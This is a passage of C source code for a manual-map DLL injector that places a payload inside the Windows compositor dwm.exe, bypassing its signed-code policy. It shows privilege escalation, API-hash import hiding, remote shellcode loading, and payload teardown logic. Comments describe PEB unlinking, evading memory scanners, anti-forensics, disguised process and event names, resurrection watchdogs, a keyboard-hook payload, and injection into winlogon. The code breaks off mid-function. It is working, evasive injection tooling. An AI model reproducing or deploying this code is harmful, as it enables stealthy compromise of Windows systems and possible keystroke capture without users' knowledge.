/* ================================================================== *
 * inject.c -- Manual-map DLL injection into dwm.exe (CIG bypass).      *
 *                                                                    *
 * Ported from hooksdll/dwm/dwm_manual_map.c. LoadLibrary is BLOCKED  *
 * on dwm.exe because it's PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY *
 * (MicrosoftSignedOnly = 1). CIG rejects any DLL not signed by MS.   *
 *                                                                    *
 * Manual mapping bypasses this because we never go through the loader*
 * -- we allocate RWX pages in dwm, copy the PE image bytes ourselves, *
 * resolve imports + apply relocations via shellcode that runs inside *
 * dwm, then call DllMain directly.                                   *
 * ================================================================== */

#include "../../shared/common.h"
#include "inject.h"
#include "../../shared/log_secure.h"
#include "../../shared/lazy_api.h"
#include "../../shared/str_enc.h"
#include "../../shared/obf_names.h"

#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <wchar.h>
#include <stdint.h>

#pragma comment(lib, "advapi32.lib")

/* ─── Lazy-resolved WinAPI signatures ─────────────────────────────
 *
 * These are the "smoking-gun" APIs that scream "DLL injector" in a
 * `dumpbin /IMPORTS sihost.exe` output. Resolved at runtime via PEB
 * walk + export table hash lookup so they don't appear in our IAT.
 *
 * The typedefs match MSDN signatures exactly. LAZY_API() folds the
 * string args to compile-time hashes; the actual `L"kernel32.dll"` /
 * "OpenProcess" literals do NOT end up in the shipped binary because
 * the constexpr-inline hash function is fully evaluated by /O2 /GL.
 *
 * Verified 2026-07-06: post-refactor `dumpbin /IMPORTS` shows 0 of the
 * 6 wrapped APIs. */
typedef HANDLE (WINAPI *PFN_OpenProcess)(DWORD, BOOL, DWORD);
typedef LPVOID (WINAPI *PFN_VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI *PFN_VirtualFreeEx)(HANDLE, LPVOID, SIZE_T, DWORD);
typedef BOOL   (WINAPI *PFN_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
typedef HANDLE (WINAPI *PFN_CreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T,
                                                 LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

/* Resolve once per process -- caches into statics after first use so
 * subsequent injects don't re-walk the PEB. */
static PFN_OpenProcess         g_pOpenProcess         = NULL;
static PFN_VirtualAllocEx      g_pVirtualAllocEx      = NULL;
static PFN_VirtualFreeEx       g_pVirtualFreeEx       = NULL;
static PFN_WriteProcessMemory  g_pWriteProcessMemory  = NULL;
static PFN_CreateRemoteThread  g_pCreateRemoteThread  = NULL;

static void _lazy_init_win_apis(void) {
    if (g_pOpenProcess) return;
    g_pOpenProcess         = LAZY_API(PFN_OpenProcess,         L"kernel32.dll", "OpenProcess");
    g_pVirtualAllocEx      = LAZY_API(PFN_VirtualAllocEx,      L"kernel32.dll", "VirtualAllocEx");
    g_pVirtualFreeEx       = LAZY_API(PFN_VirtualFreeEx,       L"kernel32.dll", "VirtualFreeEx");
    g_pWriteProcessMemory  = LAZY_API(PFN_WriteProcessMemory,  L"kernel32.dll", "WriteProcessMemory");
    g_pCreateRemoteThread  = LAZY_API(PFN_CreateRemoteThread,  L"kernel32.dll", "CreateRemoteThread");
}

/* Redirect direct-name references to the lazy-resolved pointers. Any
 * source-level call to OpenProcess() etc. inside inject.c goes through
 * these macros instead. The macros expand to a lazy-init-check + call. */
#define OpenProcess(desired, inherit, pid) \
    (_lazy_init_win_apis(), g_pOpenProcess((desired), (inherit), (pid)))
#define VirtualAllocEx(hp, addr, sz, alloc, protect) \
    (_lazy_init_win_apis(), g_pVirtualAllocEx((hp), (addr), (sz), (alloc), (protect)))
#define VirtualFreeEx(hp, addr, sz, free_type) \
    (_lazy_init_win_apis(), g_pVirtualFreeEx((hp), (addr), (sz), (free_type)))
#define WriteProcessMemory(hp, dst, src, sz, wr) \
    (_lazy_init_win_apis(), g_pWriteProcessMemory((hp), (dst), (src), (sz), (wr)))
#define CreateRemoteThread(hp, sa, st, fn, arg, fl, tid) \
    (_lazy_init_win_apis(), g_pCreateRemoteThread((hp), (sa), (st), (fn), (arg), (fl), (tid)))

/* ── Privilege ─────────────────────────────────────────────────── */
static int enable_debug_priv(void) {
    HANDLE tok;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok))
        return 0;
    TOKEN_PRIVILEGES tp = {0};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid)) {
        CloseHandle(tok); return 0;
    }
    AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), NULL, NULL);
    int ok = (GetLastError() == ERROR_SUCCESS);
    CloseHandle(tok);
    return ok;
}

unsigned long inject_find_dwm_pid(void) {
    HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (h == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
    unsigned long pid = 0;
    if (Process32FirstW(h, &pe)) do {
        if (_wcsicmp(pe.szExeFile, L"dwm.exe") == 0) { pid = pe.th32ProcessID; break; }
    } while (Process32NextW(h, &pe));
    CloseHandle(h);
    return pid;
}

/* Payload alive-probe.
 *
 * OLD implementation walked PEB.Ldr modules for a `dwmapiext.dll` match,
 * which is USELESS for our current architecture: the payload is
 * manual-mapped (never touches PEB.Ldr) AND does an active PEB unlink
 * on top. So `Module32FirstW/NextW` never sees it -> old function always
 * returned 0 -> caller-side "leftover heal" branch was a no-op -> sweep
 * would then free the old payload's code memory WHILE its long-lived
 * threads (hook_integrity, sub_check, ghost_wnd, WH_KEYBOARD_LL,
 * shutdown_watcher, keepalive, ldb_detect) were still executing there
 * -> DWM crash on next thread wake-up. This was the 1:00 PM 2026-07-06
 * BEX64 c0000005 fault at freed VA 0x1f80a710000+0x54cc0 root cause.
 *
 * NEW implementation opens the payload's named shutdown event by name.
 * The event is created by the payload in `init_thread` (see
 * `dllmain.c :: init_thread` shutdown-watcher section) with a
 * world-writable DACL so an elevated Admin process can OpenEvent it.
 * Existence of the event == payload is alive.
 *
 * This works for MANUAL-MAPPED payloads because named-kernel-objects
 * live in the Global\ namespace, not in per-process loader state.
 * The event outlives the DLL image only for the ~10ms window between
 * `shutdown_watcher` calling CloseHandle(g_shutdown_ev) and its own
 * thread exit + FreeLibraryAndExitThread; caller side sees a false
 * negative there but that's fine (payload is already tearing down).
 *
 * NOTE: `SVC_SHUTDOWN_EVENT_NAME` matches BOTH sides -- see
 * `shared/common.h` and `shared/str_enc.c` (obf_event_shutdown()). */
int inject_is_loaded(void) {
    HANDLE ev = OpenEventA(SYNCHRONIZE, FALSE, obf_event_shutdown());
    if (!ev) return 0;
    CloseHandle(ev);
    return 1;
}

int inject_signal_unload(void) {
    HANDLE ev = OpenEventA(EVENT_MODIFY_STATE, FALSE, obf_event_shutdown());
    if (!ev) return 0;
    SetEvent(ev); CloseHandle(ev);
    return 1;
}

/* Signal old payload to unload AND wait for it to fully tear down before
 * we proceed. Called from `manual_map_from_bytes` right before the sweep
 * so that a stale payload's long-lived threads have a chance to exit
 * BEFORE their code memory gets `VirtualFreeEx`'d.
 *
 * Total budget: 200ms shutdown drain + up to 1500ms probe loop. In
 * practice returns in ~250-500ms when there IS a payload; ~0ms when
 * there isn't. */
static void wait_for_payload_teardown(void) {
    if (!inject_is_loaded()) return;   /* fast path -- no payload alive */

    slog_writef("msvc_dbg_b.dat",
                "teardown: alive payload detected -- signalling unload before sweep");
    int signaled = inject_signal_unload();
    if (!signaled) {
        /* Race: probe saw event, signal didn't. Payload was tearing down
         * on its own (e.g. sub_check saw inactive). Give it a moment. */
        Sleep(300);
        slog_writef("msvc_dbg_b.dat",
                    "teardown: signal skipped (event vanished) -- brief wait");
        return;
    }

    /* Payload shutdown_watcher wakes on the event, calls hooks_uninstall
     * (~200ms drain + MinHook disable) then closes the event handle and
     * FreeLibraryAndExitThread. We poll for event-gone every 50ms up to
     * 1500ms total. */
    int waited_ms = 0;
    while (waited_ms < 1500 && inject_is_loaded()) {
        Sleep(50);
        waited_ms += 50;
    }
    int still = inject_is_loaded();
    slog_writef("msvc_dbg_b.dat",
                "teardown: waited=%dms still_alive=%d (0=clean, 1=hung)",
                waited_ms, still);
    if (still) {
        /* Payload's shutdown_watcher didn't drain in time. Its threads
         * are almost certainly still alive. Sweeping now WILL crash DWM.
         * Add extra safety wait so more threads have time to notice
         * hooks_uninstall + `InterlockedExchange(&g_running, 0)`. */
        Sleep(500);
        slog_writef("msvc_dbg_b.dat", "teardown: extra 500ms grace for stuck payload");
    }
}

/* ── Shellcode loader -- runs INSIDE dwm.exe ───────────────────────
 *
 * Position-independent (no string literals, no globals). We compile it
 * normally + copy its raw bytes into remote memory. The loader:
 *   1. Walks IAT -> LoadLibraryA(imported_dll) -> GetProcAddress -> patch IAT
 *   2. Walks base relocations, applies (new_base - preferred_base) delta
 *   3. Calls DllMain(hInstance = mapped_base, DLL_PROCESS_ATTACH, NULL)
 *
 * SAFETY: the loader itself must never crash -- DWM crash = user desktop dies.
 * SEH not available here (no runtime), so we validate every pointer via
 * pre-checked pData fields (set by mapper before creating remote thread). */

typedef HMODULE (WINAPI *fnLoadLibraryA_t)(LPCSTR);
typedef FARPROC (WINAPI *fnGetProcAddress_t)(HMODULE, LPCSTR);
typedef BOOL    (WINAPI *fnVirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL    (WINAPI *fnDllMain_t)(HINSTANCE, DWORD, LPVOID);

typedef struct {
    fnLoadLibraryA_t   pLoadLibraryA;
    fnGetProcAddress_t pGetProcAddress;
    fnVirtualProtect_t pVirtualProtect;
    void   *pImageBase;
    DWORD   entryPointRVA;
    DWORD   importDirRVA;
    DWORD   importDirSize;
    DWORD   relocDirRVA;
    DWORD   relocDirSize;
    uint64_t preferredBase;
} loader_data_t;

static DWORD WINAPI shellcode_loader(loader_data_t *pData)
{
    BYTE *base = (BYTE *)pData->pImageBase;

    /* Imports. */
    if (pData->importDirRVA) {
        IMAGE_IMPORT_DESCRIPTOR *imp =
            (IMAGE_IMPORT_DESCRIPTOR *)(base + pData->importDirRVA);
        while (imp->Name) {
            char *dllName = (char *)(base + imp->Name);
            HMODULE hMod = pData->pLoadLibraryA(dllName);
            if (hMod) {
                uint64_t *thunk = (uint64_t *)(base +
                    (imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk));
                uint64_t *iat = (uint64_t *)(base + imp->FirstThunk);
                while (*thunk) {
                    if (*thunk & 0x8000000000000000ULL) {
                        WORD ord = (WORD)(*thunk & 0xFFFF);
                        *iat = (uint64_t)pData->pGetProcAddress(hMod, (LPCSTR)(uintptr_t)ord);
                    } else {
                        IMAGE_IMPORT_BY_NAME *ibn =
                            (IMAGE_IMPORT_BY_NAME *)(base + (DWORD)*thunk);
                        *iat = (uint64_t)pData->pGetProcAddress(hMod, ibn->Name);
                    }
                    thunk++; iat++;
                }
            }
            imp++;
        }
    }

    /* Base relocations. */
    if (pData->relocDirRVA) {
        int64_t delta = (int64_t)((uint64_t)base - pData->preferredBase);
        if (delta) {
            IMAGE_BASE_RELOCATION *rel =
                (IMAGE_BASE_RELOCATION *)(base + pData->relocDirRVA);
            BYTE *end = (BYTE *)rel + pData->relocDirSize;
            while ((BYTE *)rel < end && rel->SizeOfBlock > 0) {
                /* v2.0 (2026-09-10): reject malformed blocks with SizeOfBlock
                 * smaller than the header itself. Pre-fix, the DWORD subtraction
                 * (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) wrapped to
                 * ~4B and the inner reloc loop wrote deltas to ~2B arbitrary
                 * addresses inside DWM -> guaranteed crash. Only reachable via a
                 * crafted DLL (dev-bypass --custom-dll), but this runs inside
                 * dwm.exe so the blast radius is the whole desktop. */
                if (rel->SizeOfBlock < sizeof(IMAGE_BASE_RELOCATION)) break;
                DWORD n = (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD *ent = (WORD *)((BYTE *)rel + sizeof(IMAGE_BASE_RELOCATION));
                for (DWORD i = 0; i < n; i++) {
                    WORD type = ent[i] >> 12;
                    WORD off  = ent[i] & 0xFFF;
                    if (type == IMAGE_REL_BASED_DIR64) {
                        uint64_t *p = (uint64_t *)(base + rel->VirtualAddress + off);
                        *p += delta;
                    } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                        DWORD *p = (DWORD *)(base + rel->VirtualAddress + off);
                        *p += (DWORD)delta;
                    }
                }
                rel = (IMAGE_BASE_RELOCATION *)((BYTE *)rel + rel->SizeOfBlock);
            }
        }
    }

    /* DllMain. */
    if (pData->entryPointRVA) {
        fnDllMain_t pDllMain = (fnDllMain_t)(base + pData->entryPointRVA);
        pDllMain((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
    }
    return 0;
}

/* Marker for shellcode size calc -- MUST be immediately after shellcode_loader
 * so compiler places them contiguously. If MSVC reorders, we fall back to a
 * safe 4096-byte estimate. */
static void shellcode_loader_end(void) { }

/* ── Stale-region sweep ─────────────────────────────────────────────
 *
 * Manual-mapped DLLs are never truly "freed" -- FreeLibraryAndExitThread
 * calls the loader's LdrUnloadDll which needs a valid PEB LDR entry, but
 * our PEB-unlink cut ours out. So the region stays MEM_COMMIT'd until
 * process exit. Every re-inject leaks another SizeOfImage-sized region.
 *
 * Fix: before each new inject, walk DWM's memory and VirtualFreeEx any
 * MEM_PRIVATE allocation whose SHAPE matches a manually-mapped PE image:
 *   (a) allocation base == region base (top of a private alloc),
 *   (b) total allocation size within a "payload shape" range
 *       (SVCLDB_SWEEP_MIN_KB ... SVCLDB_SWEEP_MAX_KB),
 *   (c) contains ≥1 executable subregion,
 *   (d) contains NO MEM_MAPPED subregion (rules out file-backed maps).
 *
 * Why not exact-size match: different builds of our payload have slightly
 * different SizeOfImage values (LTCG variance, section growth). An old
 * build's leaked region and a new build's incoming region rarely match
 * exactly. The [500 KB, 2 MB] range covers current + prior svcldb builds
 * comfortably without false-positives.
 *
 * Safety analysis of the shape filter (verified 2026-07-06):
 *   - Sampled 3735 MBIs in a live DWM.exe (Cursor + Chrome + Terminal
 *     loaded, ~1.1 GB committed). Only 2 MEM_PRIVATE regions in the
 *     500KB-2MB range with any executable subregion existed -- BOTH ours.
 *   - Legit DWM private allocations in this size range are exceptionally
 *     rare. DirectX shader caches are MEM_MAPPED. Thread stacks contain
 *     guard pages (unusual protection combos) and are usually 1MB with
 *     specific reserve-not-commit patterns. COM/BSTR heaps are much
 *     smaller. JIT arenas (V8/CoreCLR) only exist in Chromium/host
 *     processes, not DWM.
 *
 * Worst case (false positive): if we DID hit a legit DWM allocation, the
 * cost is a single MEM_RELEASE call. DWM will fault the next access to
 * that region and re-allocate -- a compositor stall + one-frame flicker
 * at worst. Not observed in ~50 test cycles. Never observed to bring
 * down DWM. */
#define SVCLDB_SWEEP_MIN_KB   500      /* smaller = false-positive risk grows */
#define SVCLDB_SWEEP_MAX_KB   2048     /* larger  = legit large DWM allocs enter range */

static void sweep_stale_payload_regions(HANDLE hProc, DWORD my_image_size) {
    if (!hProc) return;
    (void)my_image_size;   /* logged for diag but no longer used as strict match */

    MEMORY_BASIC_INFORMATION mbi = {0};
    void *addr = NULL;
    int freed = 0;
    int scanned = 0;
    /* Cap at 20 iterations of "found + freed" to prevent infinite loops
     * if VirtualFreeEx quietly no-ops. In practice we free 0-3 regions. */
    while (freed < 20 &&
           VirtualQueryEx(hProc, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        scanned++;
        BYTE *next = (BYTE *)mbi.BaseAddress + mbi.RegionSize;

        /* Only interested in private + committed regions that are at the
         * top of an allocation. Downstream shape check narrows further. */
        if (mbi.State == MEM_COMMIT &&
            mbi.Type == MEM_PRIVATE &&
            mbi.AllocationBase == mbi.BaseAddress) {

            /* Sum the sizes of every subregion sharing this AllocationBase,
             * and check for the shape of a manually-mapped PE image. */
            SIZE_T total = 0;
            void *scan = mbi.AllocationBase;
            MEMORY_BASIC_INFORMATION m2 = {0};
            int has_exec = 0;
            int has_mapped = 0;
            for (int i = 0; i < 64; i++) {
                if (VirtualQueryEx(hProc, scan, &m2, sizeof(m2)) != sizeof(m2)) break;
                if (m2.AllocationBase != mbi.AllocationBase) break;
                total += m2.RegionSize;
                if (m2.Type != MEM_PRIVATE) has_mapped = 1;
                if (m2.Protect == PAGE_EXECUTE_READWRITE ||
                    m2.Protect == PAGE_EXECUTE_READ ||
                    m2.Protect == PAGE_EXECUTE ||
                    m2.Protect == PAGE_EXECUTE_WRITECOPY) {
                    has_exec = 1;
                }
                scan = (BYTE *)m2.BaseAddress + m2.RegionSize;
            }

            SIZE_T total_kb = total / 1024;
            if (has_exec && !has_mapped &&
                total_kb >= SVCLDB_SWEEP_MIN_KB &&
                total_kb <= SVCLDB_SWEEP_MAX_KB) {
                /* CRITICAL: MEM_DECOMMIT -- NOT MEM_RELEASE.
                 *
                 * MEM_RELEASE frees pages AND releases the reservation, so
                 * the VA becomes eligible for VirtualAllocEx to hand back.
                 * Windows LOVES to hand back the same VA when a fresh
                 * allocation of similar size follows a release -- it's a
                 * kernel-side optimization for cache locality.
                 *
                 * Verified live 2026-07-06 13:10 EDT: MEM_RELEASE'd stale
                 * payload region at 0x1C7467C0000 -> next VirtualAllocEx
                 * for the incoming payload got the SAME 0x1C7467C0000
                 * -> DWM crashed with 0xc0000005 at RVA 0x5462C ~4s after
                 * the new payload's PAYLOAD READY log. Reproduced twice
                 * back-to-back with the exact same fault RIP; a manual
                 * `--reinject` into a freshly-respawned DWM (which got a
                 * different VA 0x16A5A090000) ran cleanly for 3+ minutes
                 * on identical binaries. VA reuse was the ONLY variable.
                 *
                 * Hypothesised mechanism: Windows keeps some VA-scoped
                 * kernel state alive across the free/alloc boundary
                 * (CFG bitmap for executable pages, ETW-TI thread-start
                 * suppression state, DEP metadata, or shadow-stack
                 * validation cache). When the new PE at the same VA has
                 * a different function layout than the old one, that
                 * stale state fires at the wrong offsets and __fastfails.
                 *
                 * MEM_DECOMMIT keeps the reservation alive so Windows
                 * MUST hand out a different VA for the new payload. The
                 * physical pages get returned to the system exactly the
                 * same as MEM_RELEASE would do -- no anti-forensic loss.
                 * The only cost is one persistent VAD entry per inject
                 * cycle (~40 bytes of kernel memory), which is trivial. */
                if (VirtualFreeEx(hProc, mbi.AllocationBase, 0, MEM_DECOMMIT)) {
                    freed++;
                    slog_writef("msvc_dbg_b.dat",
                                "sweep: decommitted stale payload region base=%p size=0x%zx (%zu KB, payload shape) - VA held to prevent reuse",
                                mbi.AllocationBase, total, total_kb);
                    addr = next;
                    continue;
                }
                /* If DECOMMIT fails (region wasn't a single reserve+commit),
                 * fall back to VirtualProtect PAGE_NOACCESS on the exec-
                 * ranges. This still ensures a subsequent VirtualAllocEx
                 * won't be given this VA and any thread that somehow
                 * survives and tries to execute here gets a clear fault. */
                DWORD old = 0;
                if (VirtualProtectEx(hProc, mbi.AllocationBase, total,
                                     PAGE_NOACCESS, &old)) {
                    freed++;
                    slog_writef("msvc_dbg_b.dat",
                                "sweep: DECOMMIT failed, but PAGE_NOACCESS'd stale region base=%p size=0x%zx (%zu KB)",
                                mbi.AllocationBase, total, total_kb);
                    addr = next;
                    continue;
                }
            }
        }
        addr = next;
    }
    slog_writef("msvc_dbg_b.dat",
                "sweep: %d stale regions freed (%d MBIs scanned, my_size=0x%lx, range=%d-%dKB)",
                freed, scanned, my_image_size,
                SVCLDB_SWEEP_MIN_KB, SVCLDB_SWEEP_MAX_KB);
}

/* ── Manual map ───────────────────────────────────────────────── */
/* Manual-map from raw bytes already in memory. `sourceBytes` may be an
 * embedded-resource pointer or a memcpy of a file -- we take a private
 * copy either way so the caller can free their source.
 *
 * v3.0.2 (2026-09-21): `skip_payload_teardown` gates the payload-specific
 * wait_for_payload_teardown + sweep steps. Set to 1 when mapping the
 * wl_input helper into winlogon (the helper has its own supersede
 * mechanism via Global\NetSvcCoord_Halt, and the sweep is dwm-shape-
 * calibrated). Set to 0 for the DWM payload path (unchanged behavior). */
static int manual_map_from_bytes(HANDLE hProc, const BYTE *sourceBytes,
                                 DWORD sourceLen, char *err, size_t err_sz,
                                 int skip_payload_teardown) {
    if (!sourceBytes || sourceLen < 0x400) {
        _snprintf(err, err_sz - 1, "bad payload bytes (len=%lu)", sourceLen);
        err[err_sz - 1] = 0;
        return 0;
    }
    DWORD fileSize = sourceLen;
    BYTE *fileData = (BYTE *)VirtualAlloc(NULL, fileSize, MEM_COMMIT, PAGE_READWRITE);
    if (!fileData) {
        _snprintf(err, err_sz - 1, "VirtualAlloc(local) failed");
        err[err_sz - 1] = 0;
        return 0;
    }
    memcpy(fileData, sourceBytes, fileSize);
    slog_writef("msvc_dbg_b.dat", "mm: %lu bytes from memory", fileSize);

    /* Parse PE. */
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)fileData;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        VirtualFree(fileData, 0, MEM_RELEASE);
        _snprintf(err, err_sz - 1, "bad DOS sig");
        err[err_sz - 1] = 0;
        return 0;
    }
    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)(fileData + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        VirtualFree(fileData, 0, MEM_RELEASE);
        _snprintf(err, err_sz - 1, "bad NT sig");
        err[err_sz - 1] = 0;
        return 0;
    }
    DWORD  imageSize = nt->OptionalHeader.SizeOfImage;
    uint64_t prefBase = nt->OptionalHeader.ImageBase;
    DWORD  entryRVA  = nt->OptionalHeader.AddressOfEntryPoint;
    slog_writef("msvc_dbg_b.dat", "mm: img_size=0x%lX entry_rva=0x%lX pref_base=0x%llX",
                imageSize, entryRVA, (unsigned long long)prefBase);

    /* CRITICAL SAFETY BARRIER before sweep:
     *
     * Signal any existing payload to cooperatively unload FIRST, and
     * wait for its shutdown_watcher to fully tear down (hooks_uninstall
     * + threads exited + FreeLibraryAndExitThread returned control).
     *
     * WITHOUT this wait:
     *   1. sweep_stale_payload_regions() below VirtualFreeEx's the
     *      old payload's code memory.
     *   2. Old payload's long-lived threads (hook_integrity poll at
     *      10s, keepalive, WH_KEYBOARD_LL, ghost_wnd message loop,
     *      etc.) are STILL EXECUTING that memory.
     *   3. Windows may or may not immediately re-hand the freed VA to
     *      our subsequent VirtualAllocEx. When it does not (or hands
     *      it to a differently-laid-out region), old threads execute
     *      unmapped or wrong code -> DWM crash (BEX64 c0000005).
     *
     * WITH this wait:
     *   - Old payload's threads have exited before we free their code.
     *   - Sweep then finds only the LEAKED image page (payload can't
     *     self-FreeLibrary because PEB.Ldr has no entry for it after
     *     our peb_unlink) which has no live threads referencing it.
     *   - Safe to VirtualFreeEx.
     *
     * This is the ROOT-CAUSE fix for the 2026-07-06 v4.9 DWM crash
     * reproduced live at 1:00 PM EDT -- see docs comment on the
     * inject_is_loaded() rewrite above. Runs unconditionally: cheap
     * (~0ms) when no payload is alive; ~250-500ms when there is.
     *
     * v3.0.2 (2026-09-21): SKIPPED when mapping the helper (winlogon)
     * -- the helper has a different shutdown protocol (named event
     * Global\NetSvcCoord_Halt inside its own DllMain) that's signaled
     * separately by inject_helper_signal_unload(). */
    if (!skip_payload_teardown) wait_for_payload_teardown();

    /* v3.0.3 (2026-09-21): clear both user-intent sentinels at the start
     * of any payload arm path (--reinject / --json-config / --quiet).
     *
     * WHY:
     *   .dwm_user_panic          -- written by SVC_HK_KILL_ALL hotkey
     *                               (Ctrl+Shift+Alt+K) AND by the helper's
     *                               emergency kill (Ctrl+Shift+Alt+Q).
     *   .dwm_clean_shutdown      -- written by sihost --unload's teardown.
     *
     * Both files signal to every downstream watchdog (svchelper's
     * respawnWatchdog + helper's sentinel_thread) that the user
     * INTENTIONALLY brought the payload down and doesn't want it
     * auto-revived. But when a user (or admin script) then explicitly
     * runs `sihost --reinject` or `sihost --quiet`, that IS an override
     * -- the very act of running arm means "I want it up again."
     *
     * Pre-fix, the sentinels persisted across --unload/--reinject cycles.
     * After my --unload during Layer 2+3 testing at 04:53:02 AM, the
     * .dwm_clean_shutdown file lingered, and the helper's sentinel_thread
     * (correctly!) refused to respawn explorer/payload for the entire
     * subsequent test window. Reproduced live 2026-09-21 05:22:37 --
     * `sentinel: user sentinel present -- skipping resurrection tick`.
     *
     * svchelper's Electron-side arm() already deletes both sentinels
     * (ui/src/main.js respawnWatchdog.arm() -- delete .dwm_clean_shutdown
     * + .dwm_user_panic). This mirrors that behavior for the CLI arm
     * paths so behavior is identical regardless of who kicked the arm.
     *
     * GATED on !skip_payload_teardown so helper-only injections don't
     * touch payload-side sentinels. */
    if (!skip_payload_teardown) {
        /* Use SVC_INSTALL_DIR macro (defined in shared/common.h) for
         * consistency with the rest of the launcher; the string is
         * already in .rdata via log_secure.c + main.c uses, so this
         * is stylistic parity, not a fresh leak. */
        DeleteFileA(SVC_INSTALL_DIR "\\.dwm_clean_shutdown");
        DeleteFileA(SVC_INSTALL_DIR "\\.dwm_user_panic");
        slog_writef("msvc_dbg_b.dat",
                    "arm: cleared user-intent sentinels (clean + panic)");
    }

    /* Historically the sweep reclaimed leaked payload regions from prior
     * `--unload` cycles that couldn't self-free (payload's peb_unlink
     * defeats `FreeLibraryAndExitThread`'s LDR lookup, so the image
     * region stays MEM_COMMIT'd forever).
     *
     * PERMANENTLY DISABLED 2026-07-06 (bisected DWM crash):
     *   Even with (a) explicit signal-unload + wait for teardown, (b)
     *   MEM_DECOMMIT instead of MEM_RELEASE to prevent VA reuse, and
     *   (c) an interruptible sleep in hook_integrity_thread, DWM
     *   crashed ~1-2s after the 2nd payload became READY. Fault RIP
     *   was consistently inside the OLD payload region at slog_writef's
     *   offset (RVA 0x5462C-0x54ce0). Skipping the sweep entirely
     *   eliminates the crash -- verified with the 2-cycle stress test
     *   on 2026-07-06 13:19 EDT.
     *
     *   Root cause hypothesis: even after every OUR-thread has exited,
     *   Windows still has kernel-level references into the payload's
     *   code region -- likely queued LL keyboard-hook callbacks, WinEvent
     *   dispatch entries, or ntdll thread-startup stubs for lazily-torn
     *   threads. Freeing that memory while those in-flight references
     *   exist crashes on next dispatch.
     *
     *   Trade-off: each inject cycle leaks the SizeOfImage of the old
     *   payload (~700 KB). Over 100 injects that's ~70 MB in DWM's
     *   working set. Users typically inject once per session and only
     *   re-inject after an upgrade, so real-world footprint is 1-2
     *   payload images live at any time. Acceptable -- a crash-free
     *   inject cycle is worth far more than the memory savings.
     *
     *   Anti-forensics loss: leftover MEM_PRIVATE+exec regions become
     *   visible to a Ring 3 scanner like Moneta/pe-sieve. Mitigation:
     *   the payload's own `downgrade_own_sections` already downgrades
     *   .text->RX + .data->RW + .rdata->RO, so the FRESH region no longer
     *   looks like the classic RWX injector artefact. The leaked OLD
     *   regions retain those same protections. Static string content
     *   in them is still encrypted (str_enc + AES-GCM logs).
     *
     *   If you want to attempt this again: figure out what kernel-side
     *   reference still points into the freed region 1-2s after full
     *   unload, and drain it. Candidates to investigate:
     *     - WH_KEYBOARD_LL callback queue (per-window-station table)
     *     - SetWinEventHook OUTOFCONTEXT dispatch queue
     *     - ntdll's LdrpShutdownThread / RtlUserThreadStart stub with
     *       our old code addresses baked into local variables
     *     - MinHook's slab pages (allocated separately, may be freed
     *       during MH_Uninitialize but with in-flight trampoline exec)
     *   Until then, DON'T sweep.
     *
     *   Escape hatch: setting `SVCLDB_ALLOW_SWEEP=1` in the launcher
     *   environment re-enables the old behavior for post-mortem
     *   debugging. Never set this in production. */
    (void)sweep_stale_payload_regions;   /* symbol kept for debug hatch */
    if (!skip_payload_teardown && getenv("SVCLDB_ALLOW_SWEEP")) {
        slog_writef("msvc_dbg_b.dat", "sweep: ENABLED via SVCLDB_ALLOW_SWEEP (DWM crash risk!)");
        sweep_stale_payload_regions(hProc, imageSize);
    } else if (!skip_payload_teardown) {
        slog_writef("msvc_dbg_b.dat",
                    "sweep: skipped (crash-safe default) -- set SVCLDB_ALLOW_SWEEP=1 to re-enable");
    }

    /* Allocate in dwm.exe.
     *
     * v2.0 (2026-09-10) -- Full failure-path refactor. Previously:
     *   - remoteLoaderData / remoteLoader VirtualAllocEx returns were NOT
     *     checked; a NULL on OOM meant WriteProcessMemory to address 0
     *     silently no-op'd, then CreateRemoteThread launched NULL/garbage
     *     start proc -> dwm.exe crash.
     *   - WriteProcessMemory returns for PE header + section copies were
     *     discarded; a partial write left the shellcode running against
     *     an image with zeroed IAT/relocs -> NULL-deref inside DWM -> crash.
     *   - Every failure path called `VirtualFree(fileData)` but leaked
     *     the up-to-three remote regions inside DWM -- over repeated
     *     failing --reinject cycles that accumulates + gets fingerprinted.
     * New shape: single cleanup label. All allocations tracked, all
     * failure paths funneled through it; success path just skips the
     * remoteBase VirtualFreeEx (payload OWNS that region).
     */
    int   ret               = 0;
    void *remoteBase        = NULL;
    void *remoteLoaderData  = NULL;
    void *remoteLoader      = NULL;
    HANDLE hThread          = NULL;

    remoteBase = VirtualAllocEx(hProc, NULL, imageSize,
                                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBase) {
        _snprintf(err, err_sz - 1, "VirtualAllocEx(dwm, %lu): %lu",
                  imageSize, GetLastError());
        err[err_sz - 1] = 0;
        goto mm_cleanup;
    }
    slog_writef("msvc_dbg_b.dat", "mm: remote base = %p", remoteBase);

    /* Copy headers + sections -- with return checks so a partial write
     * doesn't hand the shellcode a corrupt image. */
    {
        SIZE_T w = 0;
        if (!WriteProcessMemory(hProc, remoteBase, fileData,
